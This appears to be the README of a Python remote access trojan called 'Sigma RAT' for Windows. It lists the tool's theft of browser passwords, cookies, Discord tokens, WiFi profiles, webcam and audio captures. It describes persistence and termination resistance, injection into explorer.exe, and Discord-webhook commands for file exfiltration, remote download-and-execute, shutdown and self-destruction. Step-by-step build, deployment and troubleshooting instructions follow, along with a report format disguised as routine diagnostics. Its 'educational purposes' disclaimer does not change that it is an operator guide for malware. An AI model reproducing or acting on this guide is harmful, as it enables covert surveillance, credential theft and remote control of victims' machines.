Sigma RAT
A Python-based remote access tool (RAT) designed for stealthy data collection, remote control, and screen streaming on Windows systems.
Note: This is for educational purposes only. Unauthorized use on systems without consent is illegal and unethical.
Features
Data Collection: Extracts system info, browser data (cookies, passwords, history), Discord tokens, WiFi profiles, clipboard, screenshots, webcam images, audio, screen recordings, and network packets.

Stealth: Adds to startup, hides files, sets process as critical to resist termination, and injects into explorer.exe.

Command & Control: Uses Discord webhooks for remote commands (e.g., !screenshot, !shutdown) with professional embeds.

Screen Streaming: Streams the victim’s screen to a server in real-time.

Self-Destruct: Deletes itself and logs with !selfdestruct.

Prerequisites
Python 3.x: For building and running the scripts.

Windows: Designed for Windows systems (some features like critical process are Windows-specific).

Dependencies: Installed via builder.bat (see below).

Discord Webhook: For C2 functionality.

Files
sigmarat.py: Main RAT script.

decrypt_sigma.py: Decrypts collected data from sigmarat.py.

stream_server.py: Server for receiving screen streams.

builder.bat: Builds sigmarat.py into an executable.

Setup
Clone or Download:
Get all files (sigmarat.py, decrypt_sigma.py, stream_server.py, builder.bat).

Configure sigmarat.py:
Open sigmarat.py and update:
WEBHOOK_URL = "WEBHOOK_URL_PLACEHOLDER": Replace with your Discord webhook URL.

STREAM_SERVER_IP = "YOUR_SERVER_IP": Set to your streaming server’s IP.

Build the Executable:
Run builder.bat:

builder.bat

Enter your Python path (e.g., C:\Python39\python.exe or press Enter for python).

Input your Discord webhook URL, streaming server IP, and port (e.g., 9999).

Wait for it to install dependencies and build dist\SigmaUtility_[random].exe.

Usage
Run the RAT:
Execute dist\SigmaUtility_[random].exe on the target machine (run as Administrator for critical process protection).

It will:
Collect and send data to your webhook.

Begin screen streaming to the specified server.

Control via Webhook:
Send commands to your Discord webhook:
!screenshot: Capture and send a screenshot.

!shutdown: Shut down the victim’s machine.

!exfil <filepath>: Exfiltrate a specific file.

!exec <url>: Download and execute a file from a URL.

!selfdestruct: Delete the RAT and logs.

View Screen Stream:
Run stream_server.py on your server machine:

python stream_server.py

Ensure the IP and port match STREAM_SERVER_IP and STREAM_SERVER_PORT in sigmarat.py.

Decrypt Data:
Use decrypt_sigma.py to view collected data:

python decrypt_sigma.py

Update input_json to your collected JSON file (e.g., sigmarat_1234.json).

Troubleshooting
Screen Share Not Working:
Verify stream_server.py is running first.

Match IP/port in sigmarat.py and stream_server.py.

Check sigmarat.log and stream_server.log for errors (e.g., "Stream client error").

Webhook Issues:
Ensure your Discord webhook URL is correct and active.

Check sigmarat.log for "Webhook send error".

Termination Resistance:
Run as Administrator to enable critical process protection (resists Task Manager "End Task").

Notes
Run as Admin: Required for critical process protection to prevent easy termination.

Logs: Check sigmarat.log for RAT status and stream_server.log for streaming issues.

Customization: Edit sigmarat.py to adjust features (e.g., change embed color, modify data collection limits).

Webhook Embed Example
Data sent to your webhook will look like:

**[Sigma Utility - System Report]**
A detailed system report has been generated and attached below. Please review the archive for comprehensive diagnostics.

**Submission Date**: 2025-03-04 12:34:56
**File**: sigmarat_data_1234.zip
**Hostname**: DESKTOP-XYZ123
**IP Address**: 192.168.1.100
**Status**: Successfully Uploaded

[Footer: Sigma Utility | Automated Diagnostics] [Timestamp: 2025-03-04T12:34:56Z]

Attached: sigmarat_data_[random].zip

Disclaimer
This tool is for educational and testing purposes only. Deploying it without permission is illegal and unethical. Use responsibly.

